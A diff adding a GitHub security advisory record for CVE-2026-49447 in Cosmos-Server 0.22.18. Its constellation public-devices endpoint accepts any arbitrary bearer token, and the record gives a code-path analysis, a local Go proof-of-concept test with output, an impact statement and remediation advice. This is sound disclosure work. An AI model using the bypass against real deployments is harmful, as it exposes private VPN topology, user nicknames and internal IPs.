@@ -1,0 +1,56 @@
+{
+  "id": "GHSA-5fqm-cc34-fcf5",
+  "modified": "2026-07-28T20:45:32.064165157Z",
+  "published": "2026-07-28T20:32:34Z",
+  "aliases": [
+    "CVE-2026-49447"
+  ],
+  "summary": "Cosmos-Server's constellation public-devices endpoint accepts arbitrary bearer tokens",
+  "details": "### Summary\n`GET /cosmos/api/constellation/public-devices` discloses Constellation device metadata to a requester that supplies any non-empty `Authorization` header. The handler strips the string `Bearer ` from the header but never validates the resulting token and never uses it in the database query.\n\nThis was confirmed locally by routing a request through the real `tokenMiddleware` with `Authorization: Bearer not-a-real-token`. The request returned public Constellation device metadata from a disposable fixture. A missing-header negative control returned `401 Unauthorized`, proving the bypass is specifically the acceptance of arbitrary bearer values.\n\n### Details\nSource-to-sink path:\n\n- `src/httpServer.go:690` registers `/api/constellation/public-devices` on the authenticated admin API router.\n- `src/httpServer.go:815-817` applies `SecureAPI(..., public=false, ...)`, which runs `tokenMiddleware`.\n- `src/httpServer.go:231-237` only treats `Authorization: Bearer cosmos_...` as a Cosmos API token for validation. Other bearer strings are not validated by the middleware and fall through to the handler.\n- `src/constellation/api_devices_public.go:42-47` checks only that the `Authorization` header is present.\n- `src/constellation/api_devices_public.go:49-50` strips `Bearer ` but does not verify the token or compare it with a device/API key.\n- `src/constellation/api_devices_public.go:63-67` queries all non-blocked and non-invisible devices without including the stripped auth value in the filter.\n- `src/constellation/api_devices_public.go:84-99` returns device names, user nicknames, cleaned VPN/internal IPs, role flags, public hostname, and port.\n\nThe handler does not call `utils.CheckPermissions`, `utils.CheckPermissionsOrSelf`, the Cosmos API-token permission check, or any Constellation-token validation before returning the data.\n\nDefault/common exposure evidence:\n\n- The route is registered in the standard server setup (`src/httpServer.go:690`).\n- Constellation is a documented product feature described as the VPN used to securely access applications remotely (`readme.md:49`).\n- The default config ships Constellation disabled (`src/utils/utils.go:104-105`), so impact requires a deployment that enables the Constellation/VPN feature and has at least one non-blocked, non-invisible device.\n- The root package identifies the product as `cosmos-server` version `0.22.18` (`package.json:1-2`).\n- The Go module is `github.com/azukaar/cosmos-server` (`go.mod:0`).\n\nFalse-positive screen:\n\n- The PoC wraps the handler in the same `tokenMiddleware` used by `SecureAPI`, so it tests the deployed middleware behavior rather than directly calling the handler alone.\n- A request with no `Authorization` header returns `401 Unauthorized`.\n- A request with `Authorization: Bearer not-a-real-token` returns `200 OK` and device metadata.\n- The fixture data is stored in a disposable embedded database under `t.TempDir()` and no external services are contacted.\n- The route is not protected by handler-level `CheckPermissions`, and the arbitrary bearer value is not used by the database query.\n\nCandidate score: 13/18. Reachability 1, attacker control 2, privilege required 2, sink impact 1, mitigation weakness 2, default exposure 1, safe PoC feasibility 2, static certainty 2, false-positive resistance 2. The lower score reflects that Constellation is disabled in the shipped default config, but it is a documented/common product feature.\n\nExploitability gate: confirmed for deployments with Constellation enabled and populated with devices. The reachable source, arbitrary-token bypass, data-disclosure impact, safe local reproduction, and affected-version evidence are present. Default exposure is feature-dependent rather than enabled in a fresh default config.\n\n### PoC\nClean-checkout maintainer recipe:\n\n1. Check out commit `88de73dcca50172393a75de0e4dc3ab93622825c` or version `0.22.18`.\n2. Create `src/zz_security_poc_test.go` with the following test.\n3. Run `go test ./src -run TestAuditPublicDevicesAllowsArbitraryBearer -count=1 -v`.\n4. Delete `src/zz_security_poc_test.go` after confirming.\n\n```go\npackage main\n\nimport (\n\t\"encoding/json\"\n\t\"net/http\"\n\t\"net/http/httptest\"\n\t\"testing\"\n\n\t\"github.com/azukaar/cosmos-server/src/constellation\"\n\t\"github.com/azukaar/cosmos-server/src/utils\"\n)\n\nfunc TestAuditPublicDevicesAllowsArbitraryBearer(t *testing.T) {\n\toldConfig := utils.MainConfig\n\toldBaseConfig := utils.BaseMainConfig\n\toldPush := utils.PushShieldMetrics\n\toldConfigFolder := utils.CONFIGFOLDER\n\tdefer func() {\n\t\tutils.MainConfig = oldConfig\n\t\tutils.BaseMainConfig = oldBaseConfig\n\t\tutils.PushShieldMetrics = oldPush\n\t\tutils.CONFIGFOLDER = oldConfigFolder\n\t\tutils.CloseEmbeddedDB()\n\t}()\n\n\tutils.PushShieldMetrics = func(string) {}\n\tutils.MainConfig = utils.DefaultConfig\n\tutils.MainConfig.NewInstall = false\n\tutils.MainConfig.HTTPConfig.Hostname = \"example.test\"\n\tutils.BaseMainConfig = utils.MainConfig\n\ttmp := t.TempDir()\n\tutils.CONFIGFOLDER = tmp + \"/\"\n\tutils.CloseEmbeddedDB()\n\tc, closeDb, err := utils.GetEmbeddedCollection(utils.GetRootAppId(), \"devices\")\n\tdefer closeDb()\n\tif err != nil {\n\t\tt.Fatalf(\"embedded collection: %v\", err)\n\t}\n\t_, err = c.InsertOne(nil, utils.ConstellationDevice{\n\t\tNickname:       \"victim-user\",\n\t\tDeviceName:     \"private-node\",\n\t\tIP:             \"10.8.0.42/24\",\n\t\tIsLighthouse:   true,\n\t\tPublicHostname: \"vpn.example.test\",\n\t\tPort:           \"4242\",\n\t\tBlocked:        false,\n\t\tInvisible:      false,\n\t})\n\tif err != nil {\n\t\tt.Fatalf(\"insert device fixture: %v\", err)\n\t}\n\n\thandler := tokenMiddleware(http.HandlerFunc(constellation.DevicePublicList))\n\tnoAuthReq := httptest.NewRequest(http.MethodGet, \"/cosmos/api/constellation/public-devices\", nil)\n\tnoAuthRec := httptest.NewRecorder()\n\thandler.ServeHTTP(noAuthRec, noAuthReq)\n\tif noAuthRec.Code != http.StatusUnauthorized {\n\t\tt.Fatalf(\"missing Authorization status = %d body = %s\", noAuthRec.Code, noAuthRec.Body.String())\n\t}\n\n\treq := httptest.NewRequest(http.MethodGet, \"/cosmos/api/constellation/public-devices\", nil)\n\treq.Header.Set(\"Authorization\", \"Bearer not-a-real-token\")\n\trec := httptest.NewRecorder()\n\thandler.ServeHTTP(rec, req)\n\tif rec.Code != http.StatusOK {\n\t\tt.Fatalf(\"DevicePublicList status = %d body = %s\", rec.Code, rec.Body.String())\n\t}\n\n\tvar body struct {\n\t\tStatus string `json:\"status\"`\n\t\tData []struct {\n\t\t\tName string `json:\"name\"`\n\t\t\tUser string `json:\"user\"`\n\t\t\tIP string `json:\"ip\"`\n\t\t\tPublicHostname string `json:\"publicHostname\"`\n\t\t} `json:\"data\"`\n\t}\n\tif err := json.Unmarshal(rec.Body.Bytes(), \u0026body); err != nil {\n\t\tt.Fatalf(\"response JSON: %v\", err)\n\t}\n\tif body.Status != \"OK\" || len(body.Data) != 1 {\n\t\tt.Fatalf(\"unexpected response body: %s\", rec.Body.String())\n\t}\n\tif body.Data[0].Name != \"private-node\" || body.Data[0].User != \"victim-user\" || body.Data[0].IP != \"10.8.0.42\" || body.Data[0].PublicHostname != \"vpn.example.test\" {\n\t\tt.Fatalf(\"unexpected device disclosure: %+v\", body.Data[0])\n\t}\n}\n```\n\nObserved output in this environment:\n\n```text\n=== RUN   TestAuditPublicDevicesAllowsArbitraryBearer\n2026/05/24 15:18:09 NOTICE: [INFO] DevicePublicList: Fetching devices with API key\n--- PASS: TestAuditPublicDevicesAllowsArbitraryBearer (0.00s)\nPASS\nok  \tgithub.com/azukaar/cosmos-server/src\t0.057s\n```\n\nControl/negative case: the same test first sends the request without `Authorization` and expects `401 Unauthorized`. The subsequent `Authorization: Bearer not-a-real-token` request succeeds and returns the fixture, proving the bypass is not an intentionally unauthenticated endpoint but an unvalidated-header check.\n\n### Impact\nAn unauthenticated network attacker can enumerate Constellation device metadata from deployments that enable the Constellation/VPN feature and have visible devices. The response exposes device names, user nicknames, internal/VPN IP addresses, node roles such as lighthouse/relay/exit-node flags, public hostnames, and ports. This information can reveal private network topology and user/device inventory and can support targeted follow-on attacks against the VPN or exposed nodes.\n\nThe issue does not require a valid Cosmos session, valid Cosmos API token, valid Constellation token, or user interaction; any arbitrary non-empty bearer string is accepted.\n\n### Suggested remediation\nReplace the header-presence check with real authorization. Depending on the intended trust model, the handler should require one of:\n\n- a valid Cosmos user/API token with an appropriate permission such as `PERM_RESOURCES_READ` or `PERM_CONFIGURATION_READ`, or\n- a dedicated Constellation device/API token that is cryptographically verified and used to scope the query to devices the caller is allowed to see.\n\nAlso add regression tests for:\n\n- missing `Authorization` header returns 401,\n- malformed/arbitrary bearer token returns 401,\n- invalid `cosmos_` API token returns 401 through middleware,\n- valid but underprivileged token is rejected,\n- valid authorized token returns only permitted devices.\n\n### Credits\n- Thai Son Dinh from VinSOC Labs (R\u0026D)\n- Nguyen Huy Vu Dung from VinSOC Labs (AppSec)",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/azukaar/cosmos-server",
+        "purl": "pkg:golang/github.com/azukaar/cosmos-server"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0.22.18"
+            },
+            {
+              "fixed": "0.22.19"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.22.18"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-5fqm-cc34-fcf5/GHSA-5fqm-cc34-fcf5.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/azukaar/Cosmos-Server/security/advisories/GHSA-5fqm-cc34-fcf5"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/azukaar/Cosmos-Server/commit/59c561d686c8f9843b3e092b50f6346c481d8bbf"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/azukaar/Cosmos-Server"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/azukaar/Cosmos-Server/releases/tag/v0.22.19"
+    }
+  ]
+}
